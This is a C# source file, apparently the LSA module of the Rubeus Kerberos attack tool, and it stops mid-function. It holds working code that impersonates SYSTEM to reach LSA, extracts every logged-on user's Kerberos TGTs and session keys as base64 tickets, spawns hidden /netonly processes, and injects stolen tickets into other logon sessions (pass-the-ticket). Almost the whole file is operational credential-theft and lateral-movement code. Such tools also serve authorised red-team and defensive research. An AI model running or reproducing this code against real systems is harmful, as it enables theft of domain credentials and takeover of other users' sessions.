﻿using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text.RegularExpressions;

using Rubeus.Asn1;
using Rubeus.lib;

namespace Rubeus
{
    internal static class LSA
    {
        internal static uint CreateProcessNetOnly(string commandLine, bool show = false)
        {
            // creates a hidden process with random /netonly credentials,
            //  displayng the process ID and LUID, and returning the LUID
            // Note: the LUID can be used with the "ptt" action
            Console.WriteLine("\r\n[*] Action: Create Process (/netonly)\r\n");

            Interop.PROCESS_INFORMATION pi;
            Interop.STARTUPINFO si = new Interop.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            if (!show) {
                // hide the window
                si.wShowWindow = 0;
                si.dwFlags = 0x00000001;
            }
            Console.WriteLine("[*] Showing process : {0}", show);

            // 0x00000002 == LOGON_NETCREDENTIALS_ONLY
            if (!Interop.CreateProcessWithLogonW(Helpers.RandomString(8), Helpers.RandomString(8), Helpers.RandomString(8), 0x00000002, commandLine, String.Empty, 0, 0, null, ref si, out pi)) {
                uint lastError = Interop.GetLastError();
                Console.WriteLine("[X] CreateProcessWithLogonW error: {0}", lastError);
                return 0;
            }
            Console.WriteLine("[+] Process         : '{0}' successfully created with LOGON_TYPE = 9", commandLine);
            Console.WriteLine("[+] ProcessID       : {0}", pi.dwProcessId);

            IntPtr hToken = IntPtr.Zero;
            IntPtr TokenInformation = IntPtr.Zero;
            try {
                // TOKEN_QUERY == 0x0008
                if (!Interop.OpenProcessToken(pi.hProcess, 0x0008, out hToken)) {
                    Console.WriteLine("[X] OpenProcessToken error: {0}", Interop.GetLastError());
                    return 0;
                }
                // first call gets length of TokenInformation to get proper struct size
                int TokenInfLength = 0;
                bool Result = Interop.GetTokenInformation(hToken, Interop.TOKEN_INFORMATION_CLASS.TokenStatistics,
                    IntPtr.Zero, TokenInfLength, out TokenInfLength);
                TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
                // second call actually gets the information
                if (!Interop.GetTokenInformation(hToken, Interop.TOKEN_INFORMATION_CLASS.TokenStatistics, TokenInformation, TokenInfLength, out TokenInfLength)) {
                    return 0;
                }
                uint identifier = (((Interop.TOKEN_STATISTICS)Marshal.PtrToStructure(TokenInformation, typeof(Interop.TOKEN_STATISTICS))).AuthenticationId).LowPart;
                Console.WriteLine("[+] LUID            : {0}", identifier);
                return identifier;
            }
            finally {
                Interop.CloseHandle(hToken);
                if (IntPtr.Zero != TokenInformation) {
                    Marshal.FreeHGlobal(TokenInformation);
                }
            }
        }

        internal static void DisplayTGTs(List<KRB_CRED> creds)
        {
            foreach(KRB_CRED cred in creds) {
                string userName = cred.EncryptedPart.ticket_info[0].pname.name_string[0];
                string domainName = cred.EncryptedPart.ticket_info[0].prealm;
                DateTime startTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.EncryptedPart.ticket_info[0].starttime);
                DateTime endTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.EncryptedPart.ticket_info[0].endtime);
                DateTime renewTill = TimeZone.CurrentTimeZone.ToLocalTime(cred.EncryptedPart.ticket_info[0].renew_till);
                Interop.TicketFlags flags = cred.EncryptedPart.ticket_info[0].flags;
                string base64TGT = Convert.ToBase64String(cred.Encode().Encode());

                Console.WriteLine("User                  :  {0}@{1}", userName, domainName);
                Console.WriteLine("StartTime             :  {0}", startTime);
                Console.WriteLine("EndTime               :  {0}", endTime);
                Console.WriteLine("RenewTill             :  {0}", renewTill);
                Console.WriteLine("Flags                 :  {0}", flags);
                Console.WriteLine("Base64EncodedTicket   :\r\n");
                foreach (string line in Helpers.Split(base64TGT, 100)) {
                    Console.WriteLine("    {0}", line);
                }
                Console.WriteLine("\r\n");
            }
        }

        internal static void DisplayTicket(KRB_CRED cred)
        {
            Console.WriteLine("\r\n[*] Action: Describe Ticket\r\n");

            string userName = cred.EncryptedPart.ticket_info[0].pname.name_string[0];
            string domainName = cred.EncryptedPart.ticket_info[0].prealm;
            string sname = cred.EncryptedPart.ticket_info[0].sname.name_string[0];
            string srealm = cred.EncryptedPart.ticket_info[0].srealm;
            string keyType = String.Format("{0}", (Interop.KERB_ETYPE)cred.EncryptedPart.ticket_info[0].key.keytype);
            string b64Key = Convert.ToBase64String(cred.EncryptedPart.ticket_info[0].key.keyvalue);
            DateTime startTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.EncryptedPart.ticket_info[0].starttime);
            DateTime endTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.EncryptedPart.ticket_info[0].endtime);
            DateTime renewTill = TimeZone.CurrentTimeZone.ToLocalTime(cred.EncryptedPart.ticket_info[0].renew_till);
            Interop.TicketFlags flags = cred.EncryptedPart.ticket_info[0].flags;
            
            Console.WriteLine("  UserName              :  {0}", userName);
            Console.WriteLine("  UserRealm             :  {0}", domainName);
            Console.WriteLine("  ServiceName           :  {0}", sname);
            Console.WriteLine("  ServiceRealm          :  {0}", srealm);
            Console.WriteLine("  StartTime             :  {0}", startTime);
            Console.WriteLine("  EndTime               :  {0}", endTime);
            Console.WriteLine("  RenewTill             :  {0}", renewTill);
            Console.WriteLine("  Flags                 :  {0}", flags);
            Console.WriteLine("  KeyType               :  {0}", keyType);
            Console.WriteLine("  Base64(key)           :  {0}\r\n", b64Key);
        }

        internal static List<KRB_CRED> ExtractTGTs(uint targetLuid = 0, bool includeComputerAccounts = false)
        {
            // extracts Kerberos TGTs for all users on the system (assuming elevation) or for a specific logon ID (luid)

            //  first elevates to SYSTEM and uses LsaRegisterLogonProcessHelper connect to LSA
            //  then calls LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type to enumerate all cached tickets
            //  and finally uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type
            //  to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)

            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            int authPack;
            string targetService = "krbtgt";
            //List<KRB_CRED> creds = new List<KRB_CRED>();
            Dictionary<String, KRB_CRED> creds = new Dictionary<String, KRB_CRED>();
            IntPtr lsaHandle = RegisterUser32LogonProcesss();

            // if the original call fails then it is likely we don't have SeTcbPrivilege
            // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
            if (lsaHandle == IntPtr.Zero) {
                string currentName = WindowsIdentity.GetCurrent().Name;
                if (currentName == "NT AUTHORITY\\SYSTEM") {
                    // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                    lsaHandle = RegisterUser32LogonProcesss();
                }
                else {
                    // elevated but not system, so gotta GetSystem() first
                    Helpers.GetSystem();
                    // should now have the proper privileges to get a Handle to LSA
                    lsaHandle = RegisterUser32LogonProcesss();
                    // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                    Interop.RevertToSelf();
                }
            }

            try {
                // obtains the unique identifier for the kerberos authentication package.
                LSACall(Interop.LsaLookupAuthenticationPackage(lsaHandle, KerberosLsaInputString, out authPack));

                // first return all the logon sessions
                DateTime systime = new DateTime(1601, 1, 1, 0, 0, 0, 0); //win32 systemdate
                ulong count;
                IntPtr luidPtr = IntPtr.Zero;
                IntPtr iter = luidPtr;
                uint ret = Interop.LsaEnumerateLogonSessions(out count, out luidPtr);  // get an array of pointers to LUIDs

                for (ulong i = 0; i < count; i++) {
                    IntPtr sessionData;
                    ret = Interop.LsaGetLogonSessionData(luidPtr, out sessionData);
                    Interop.SECURITY_LOGON_SESSION_DATA data = (Interop.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionData, typeof(Interop.SECURITY_LOGON_SESSION_DATA));

                    // if we have a valid logon
                    if (data.PSiD != IntPtr.Zero) {
                        // user session data
                        string username = Marshal.PtrToStringUni(data.Username.Buffer).Trim();

                        // exclude computer accounts unless instructed otherwise
                        if (includeComputerAccounts || !Regex.IsMatch(username, ".*\\$$")) {
                            SecurityIdentifier sid = new SecurityIdentifier(data.PSiD);
                            string domain = data.LoginDomain.GetValue();
                            string authpackage = data.AuthenticationPackage.GetValue();
                            Interop.SECURITY_LOGON_TYPE logonType = (Interop.SECURITY_LOGON_TYPE)data.LogonType;
                            DateTime logonTime = systime.AddTicks((long)data.LoginTime);
                            string logonServer = data.LogonServer.GetValue();
                            string dnsDomainName = data.DnsDomainName.GetValue();
                            string upn = data.Upn.GetValue();
                            IntPtr ticketsPointer = IntPtr.Zero;
                            DateTime sysTime = new DateTime(1601, 1, 1, 0, 0, 0, 0);

                            int returnBufferLength = 0;
                            int protocalStatus = 0;

                            // input object for querying the ticket cache for a specific logon ID
                            Interop.LUID userLogonID = new Interop.LUID(data.LoginID.LowPart);
                            Interop.KERB_QUERY_TKT_CACHE_REQUEST tQuery =
                                new Interop.KERB_QUERY_TKT_CACHE_REQUEST(userLogonID);
                            Interop.KERB_QUERY_TKT_CACHE_RESPONSE tickets =
                                new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
                            Interop.KERB_TICKET_CACHE_INFO ticket;

                            if ((targetLuid == 0) || (data.LoginID.LowPart == targetLuid)) {
                                tQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;

                                // query LSA, specifying we want the ticket cache
                                IntPtr tQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tQuery));
                                Marshal.StructureToPtr(tQuery, tQueryPtr, false);
                                LSACall(Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, tQueryPtr, Marshal.SizeOf(tQuery), out ticketsPointer, out returnBufferLength, out protocalStatus));

                                if (ticketsPointer != IntPtr.Zero) {
                                    // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
                                    tickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
                                    int count2 = tickets.CountOfTickets;

                                    if (count2 != 0) {
                                        // get the size of the structures we're iterating over
                                        int dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO));

                                        for (int j = 0; j < count2; j++) {
                                            // iterate through the result structures
                                            IntPtr currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + j * dataSize)));
                                            // parse the new ptr to the appropriate structure
                                            ticket = (Interop.KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO));
                                            // extract the serverName and ticket flags
                                            string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);
                                            if (string.IsNullOrEmpty(targetService) || (Regex.IsMatch(serverName, String.Format(@"^{0}/.*", targetService), RegexOptions.IgnoreCase))) {
                                                // now we have to call LsaCallAuthenticationPackage() again with the specific server target
                                                IntPtr responsePointer = IntPtr.Zero;
                                                // the specific logon session ID
                                                // signal that we want encoded .kirbi's returned
                                                Interop.KERB_RETRIEVE_TKT_REQUEST request =
                                                    new Interop.KERB_RETRIEVE_TKT_REQUEST(userLogonID,
                                                        Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage);
                                                Interop.KERB_RETRIEVE_TKT_RESPONSE response =
                                                    new Interop.KERB_RETRIEVE_TKT_RESPONSE();

                                                request.TicketFlags = ticket.TicketFlags;
                                                request.CacheOptions = 0x8; // KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED
                                                request.EncryptionType = 0x0;
                                                // the target ticket name we want the ticket for
                                                Interop.UNICODE_STRING tName = new Interop.UNICODE_STRING(serverName);
                                                request.TargetName = tName;

                                                // the following is due to the wonky way LsaCallAuthenticationPackage wants the KERB_RETRIEVE_TKT_REQUEST
                                                //      for KerbRetrieveEncodedTicketMessages

                                                // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len
                                                int structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
                                                int newStructSize = structSize + tName.MaximumLength;
                                                IntPtr unmanagedAddr = Marshal.AllocHGlobal(newStructSize);

                                                // marshal the struct from a managed object to an unmanaged block of memory.
                                                Marshal.StructureToPtr(request, unmanagedAddr, false);

                                                // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
                                                IntPtr newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));

                                                // copy unicode chars to the new location
                                                Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);

                                                // update the target name buffer ptr            
                                                Marshal.WriteIntPtr(unmanagedAddr, 24, newTargetNameBuffPtr);

                                                // actually get the data
                                                NativeReturnCode retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, unmanagedAddr, newStructSize, out responsePointer, out returnBufferLength, out protocalStatus);

                                                // translate the LSA error (if any) to a Windows error
                                                uint winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);

                                                if ((retCode == 0) && ((uint)winError == 0) && (returnBufferLength != 0)) {
                                                    // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                                                    response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));

                                                    int encodedTicketSize = response.Ticket.EncodedTicketSize;

                                                    // extract the ticket, build a KRB_CRED object, and add to the cache
                                                    byte[] encodedTicket = new byte[encodedTicketSize];
                                                    Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);

                                                    KRB_CRED ticketKirbi = new KRB_CRED(encodedTicket);

                                                    // uniquify initial creds by user@domain.com
                                                    string userName = ticketKirbi.EncryptedPart.ticket_info[0].pname.name_string[0];
                                                    string domainName = ticketKirbi.EncryptedPart.ticket_info[0].prealm;
                                                    string userDomain = String.Format("{0}@{1}", userName, domainName);
                                                    
                                                    if (creds.ContainsKey(userDomain)) {
                                                        // only take the ticket with the latest renew_till
                                                        if(DateTime.Compare(ticketKirbi.EncryptedPart.ticket_info[0].renew_till, creds[userDomain].EncryptedPart.ticket_info[0].renew_till) > 0) {
                                                            creds[userDomain] = ticketKirbi;
                                                        }
                                                    }
                                                    else {
                                                        creds[userDomain] = ticketKirbi;
                                                    }
                                                }
                                                else {
                                                    Console.WriteLine("\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}",
                                                        winError, serverName, Helpers.GetNativeErrorMessage(winError));
                                                }

                                                // clean up
                                                Interop.LsaFreeReturnBuffer(responsePointer);
                                                Marshal.FreeHGlobal(unmanagedAddr);
                                            }
                                        }
                                    }
                                }
                                // cleanup
                                Interop.LsaFreeReturnBuffer(ticketsPointer);
                                Marshal.FreeHGlobal(tQueryPtr);
                            }
                        }
                    }

                    // move the pointer forward
                    luidPtr = (IntPtr)((long)luidPtr.ToInt64() + Marshal.SizeOf(typeof(Interop.LUID)));

                    // cleaup
                    Interop.LsaFreeReturnBuffer(sessionData);
                }
                Interop.LsaFreeReturnBuffer(luidPtr);
                // disconnect from LSA
                Interop.LsaDeregisterLogonProcess(lsaHandle);
                return new List<KRB_CRED>(creds.Values);
                //return creds.Values;
            }
            catch (Exception ex) {
                Console.WriteLine("[X] Exception: {0}", ex);
                return null;
            }
        }

        internal static byte[] GetEncryptionKeyFromCache(string target, Interop.KERB_ETYPE etype)
        {
            // gets the cached session key for a given service ticket
            //  used by RequestFakeDelegTicket

            IntPtr lsaHandle;
            LSACall(Interop.LsaConnectUntrusted(out lsaHandle));
            int authPack;
            LSACall(Interop.LsaLookupAuthenticationPackage(lsaHandle, KerberosLsaInputString, out authPack));

            IntPtr responsePointer = IntPtr.Zero;
            // signal that we want encoded .kirbi's returned
            Interop.KERB_RETRIEVE_TKT_REQUEST request =
                new Interop.KERB_RETRIEVE_TKT_REQUEST(Interop.LUID.Empty,
                    Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage);
            Interop.KERB_RETRIEVE_TKT_RESPONSE response =
                new Interop.KERB_RETRIEVE_TKT_RESPONSE();

            request.CacheOptions = (uint)Interop.KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;
            request.EncryptionType = (int)etype;

            // target SPN to fake delegation for
            Interop.UNICODE_STRING tName = new Interop.UNICODE_STRING(target);
            request.TargetName = tName;

            // the following is due to the wonky way LsaCallAuthenticationPackage wants the KERB_RETRIEVE_TKT_REQUEST
            //      for KerbRetrieveEncodedTicketMessages

            // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len
            int structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
            int newStructSize = structSize + tName.MaximumLength;
            IntPtr unmanagedAddr = Marshal.AllocHGlobal(newStructSize);
            // marshal the struct from a managed object to an unmanaged block of memory.
            Marshal.StructureToPtr(request, unmanagedAddr, false);
            // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
            IntPtr newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));
            // copy unicode chars to the new location
            Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);
            // update the target name buffer ptr            
            Marshal.WriteIntPtr(unmanagedAddr, 24, newTargetNameBuffPtr);
            // actually get the data
            int protocalStatus = 0;
            int returnBufferLength = 0;
            NativeReturnCode retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, unmanagedAddr, newStructSize, out responsePointer, out returnBufferLength, out protocalStatus);
            // translate the LSA error (if any) to a Windows error
            uint winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);

            byte[] returnedSessionKey;
            if ((retCode == 0) && ((uint)winError == 0) && (returnBufferLength != 0)) {
                // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));

                // extract the session key
                Interop.KERB_ETYPE sessionKeyType = (Interop.KERB_ETYPE)response.Ticket.SessionKey.KeyType;
                Int32 sessionKeyLength = response.Ticket.SessionKey.Length;
                byte[] sessionKey = new byte[sessionKeyLength];
                Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);

                //string serviceName = "";
                //if (response.Ticket.ServiceName != IntPtr.Zero)
                //{
                //    Interop.KERB_EXTERNAL_NAME serviceNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ServiceName, typeof(Interop.KERB_EXTERNAL_NAME));
                //    if (serviceNameStruct.NameCount == 1)
                //    {
                //        string serviceNameStr1 = Marshal.PtrToStringUni(serviceNameStruct.Names[0].Buffer, serviceNameStruct.Names[0].Length / 2).Trim();
                //        serviceName = serviceNameStr1;
                //    }
                //    else if (serviceNameStruct.NameCount == 2)
                //    {
                //        string serviceNameStr1 = Marshal.PtrToStringUni(serviceNameStruct.Names[0].Buffer, serviceNameStruct.Names[0].Length / 2).Trim();
                //        string serviceNameStr2 = Marshal.PtrToStringUni(serviceNameStruct.Names[1].Buffer, serviceNameStruct.Names[1].Length / 2).Trim();
                //        serviceName = String.Format("{0}/{1}", serviceNameStr1, serviceNameStr2);
                //    }
                //    else { }
                //}


                //string targetName = "";
                //if (response.Ticket.TargetName != IntPtr.Zero)
                //{
                //    Interop.KERB_EXTERNAL_NAME targetNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.TargetName, typeof(Interop.KERB_EXTERNAL_NAME));
                //    if (targetNameStruct.NameCount == 1)
                //    {
                //        string targetNameStr1 = Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim();
                //        targetName = targetNameStr1;
                //    }
                //    else if (targetNameStruct.NameCount == 2)
                //    {
                //        string targetNameStr1 = Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim();
                //        string targetNameStr2 = Marshal.PtrToStringUni(targetNameStruct.Names[1].Buffer, targetNameStruct.Names[1].Length / 2).Trim();
                //        targetName = String.Format("{0}/{1}", targetNameStr1, targetNameStr2);
                //    }
                //    else { }
                //}


                //string clientName = "";
                //if (response.Ticket.ClientName != IntPtr.Zero)
                //{
                //    Interop.KERB_EXTERNAL_NAME clientNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ClientName, typeof(Interop.KERB_EXTERNAL_NAME));
                //    if (clientNameStruct.NameCount == 1)
                //    {
                //        string clientNameStr1 = Marshal.PtrToStringUni(clientNameStruct.Names[0].Buffer, clientNameStruct.Names[0].Length / 2).Trim();
                //        clientName = clientNameStr1;
                //    }
                //    else if (clientNameStruct.NameCount == 2)
                //    {
                //        string clientNameStr1 = Marshal.PtrToStringUni(clientNameStruct.Names[0].Buffer, clientNameStruct.Names[0].Length / 2).Trim();
                //        string clientNameStr2 = Marshal.PtrToStringUni(clientNameStruct.Names[1].Buffer, clientNameStruct.Names[1].Length / 2).Trim();
                //        clientName = String.Format("{0}@{1}", clientNameStr1, clientNameStr2);
                //    }
                //    else { }
                //}
                //Console.WriteLine("ServiceName: {0}", serviceName);
                //Console.WriteLine("TargetName: {0}", targetName);
                //Console.WriteLine("ClientName: {0}", clientName);

                returnedSessionKey = sessionKey;
            }
            else {
                Console.WriteLine("\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}",
                    winError, target, Helpers.GetNativeErrorMessage(winError));
                returnedSessionKey = null;
            }

            // clean up
            Interop.LsaFreeReturnBuffer(responsePointer);
            Marshal.FreeHGlobal(unmanagedAddr);

            // disconnect from LSA
            Interop.LsaDeregisterLogonProcess(lsaHandle);

            return returnedSessionKey;
        }

        internal static void ImportTicket(byte[] ticket, uint targetLuid = 0)
        {
            Console.WriteLine("\r\n[*] Action: Import Ticket");
            // straight from Vincent LE TOUX' work
            //  https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2925-L2971

            IntPtr LsaHandle = IntPtr.Zero;
            int authenticationPackage;
            int ProtocalStatus;

            if (0 != targetLuid) {
                if (!Helpers.IsHighIntegrity()) {
                    Console.WriteLine("[X] You need to be in high integrity to apply a ticket to a different logon session");
                    return;
                }
                string currentName = WindowsIdentity.GetCurrent().Name;
                if (currentName == "NT AUTHORITY\\SYSTEM") {
                    // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                    LsaHandle = RegisterUser32LogonProcesss();
                }
                else {
                    // elevated but not system, so gotta GetSystem() first
                    Helpers.GetSystem();
                    // should now have the proper privileges to get a Handle to LSA
                    LsaHandle = RegisterUser32LogonProcesss();
                    // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                    Interop.RevertToSelf();
                }
            }
            else {
                // otherwise use the unprivileged connection with LsaConnectUntrusted
                LSACall(Interop.LsaConnectUntrusted(out LsaHandle));
            }

            IntPtr inputBuffer = IntPtr.Zero;
            IntPtr ProtocolReturnBuffer;
            int ReturnBufferLength;
            try {
                NativeReturnCode ntstatus = Interop.LsaLookupAuthenticationPackage(LsaHandle, KerberosLsaInputString, out authenticationPackage);
                if (ntstatus != 0) {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    Console.WriteLine("[X] Windows error running LsaLookupAuthenticationPackage: {0}", winError);
                    return;
                }
                Interop.KERB_SUBMIT_TKT_REQUEST request = new Interop.KERB_SUBMIT_TKT_REQUEST(
                    Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage, ticket.Length);
                if (0 != targetLuid) {
                    Console.WriteLine("[*] Target LUID: 0x{0:x}", targetLuid);
                    request.LogonId = new Interop.LUID(targetLuid);
                }

                int inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST)) + ticket.Length;
                inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
                Marshal.StructureToPtr(request, inputBuffer, false);
                Marshal.Copy(ticket, 0, new IntPtr(inputBuffer.ToInt64() + request.KerbCredOffset), ticket.Length);
                ntstatus = Interop.LsaCallAuthenticationPackage(LsaHandle, authenticationPackage, inputBuffer, inputBufferSize, out ProtocolReturnBuffer, out ReturnBufferLength, out ProtocalStatus);
                if (0 != ntstatus) {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage: {0}", winError);
                    return;
                }
                if (ProtocalStatus != 0) {
                    uint winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage/ProtocalStatus: {0}", winError);
                    return;
                }
                Console.WriteLine("[+] Ticket successfully imported!");
            }
            finally {
                if (inputBuffer != IntPtr.Zero) {
                    Marshal.FreeHGlobal(inputBuffer);
                }
                if (IntPtr.Zero != LsaHandle) {
                    Interop.LsaDeregisterLogonProcess(LsaHandle);
                }
            }
        }

        internal static void ListKerberosTicketData(Interop.LUID targetLuid, string targetService = "",
            bool monitor = false)
        {
            // lists 
            if (Helpers.IsHighIntegrity()) {
                ListKerberosTicketDataAllUsers(targetLuid, targetService, monitor);
            }
            else {
                ListKerberosTicketDataCurrentUser(targetService);
            }
        }

        private static bool ListKerberosTicketData(IntPtr lsaHandle, int authenticationPackageIdentifier,
            IntPtr nativeTicket, string targetService)
        {
            // parse the new ptr to the appropriate structure
            Interop.KERB_TICKET_CACHE_INFO ticket = (Interop.KERB_TICKET_CACHE_INFO)
                Marshal.PtrToStructure(nativeTicket, typeof(Interop.KERB_TICKET_CACHE_INFO));
            // extract the serverName and ticket flags
            string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer,
                ticket.ServerName.Length / sizeof(char));

            if (!string.IsNullOrEmpty(targetService)
                && !(Regex.IsMatch(serverName, string.Format(@"^{0}/.*", targetService), RegexOptions.IgnoreCase)))
            {
                return false;
            }

            // now we have to call LsaCallAuthenticationPackage() again with the specific server target
            IntPtr responsePointer = IntPtr.Zero;
            // signal that we want encoded .kirbi's returned
            Interop.KERB_RETRIEVE_TKT_REQUEST request =
                new Interop.KERB_RETRIEVE_TKT_REQUEST(Interop.LUID.Empty,
                    Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage);
            Interop.KERB_RETRIEVE_TKT_RESPONSE response =
                new Interop.KERB_RETRIEVE_TKT_RESPONSE();

            request.TicketFlags = ticket.TicketFlags;
            request.CacheOptions = 0x8; // KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED
            request.EncryptionType = 0x0;
            // the target ticket name we want the ticket for
            Interop.UNICODE_STRING tName = new Interop.UNICODE_STRING(serverName);
            request.TargetName = tName;

            // the following is due to the wonky way LsaCallAuthenticationPackage wants the KERB_RETRIEVE_TKT_REQUEST
            //      for KerbRetrieveEncodedTicketMessages
            // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len
            int structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
            int newStructSize = structSize + tName.MaximumLength;
            IntPtr unmanagedAddr = Marshal.AllocHGlobal(newStructSize);
            try {
                // marshal the struct from a managed object to an unmanaged block of memory.
                Marshal.StructureToPtr(request, unmanagedAddr, false);
                // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
                IntPtr newTargetNameBuffPtr = (IntPtr)(unmanagedAddr.ToInt64() + structSize);
                // copy unicode chars to the new location
                Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);
                // update the target name buffer ptr            
                Marshal.WriteIntPtr(unmanagedAddr, 24, newTargetNameBuffPtr);
                // actually get the data
                int returnBufferLength;
                int protocalStatus;
                NativeReturnCode retCode = Interop.LsaCallAuthenticationPackage(lsaHandle,
                    authenticationPackageIdentifier, unmanagedAddr, newStructSize,
                    out responsePointer, out returnBufferLength, out protocalStatus);
                // translate the LSA error (if any) to a Windows error
                uint winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);

                if ((retCode == 0) && ((uint)winError == 0) && (returnBufferLength != 0)) {
                    // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                    response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure(responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));
                    Interop.KERB_EXTERNAL_TICKET responseTicket = response.Ticket;
                    string serviceName = responseTicket.GetServiceName();
                    string targetName = responseTicket.GetTargetName();
                    string clientName = responseTicket.GetClientName();
                    string domainName = responseTicket.DomainName.GetValue();
                    string targetDomainName = responseTicket.TargetDomainName.GetValue();
                    string altTargetDomainName = responseTicket.AltTargetDomainName.GetValue();

                    // extract the session key
                    Interop.KERB_ETYPE sessionKeyType = (Interop.KERB_ETYPE)response.Ticket.SessionKey.KeyType;
                    int sessionKeyLength = response.Ticket.SessionKey.Length;
                    byte[] sessionKey = new byte[sessionKeyLength];
                    Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);
                    string base64SessionKey = Convert.ToBase64String(sessionKey);

                    DateTime keyExpirationTime = DateTime.FromFileTime(response.Ticket.KeyExpirationTime);
                    DateTime startTime = DateTime.FromFileTime(response.Ticket.StartTime);
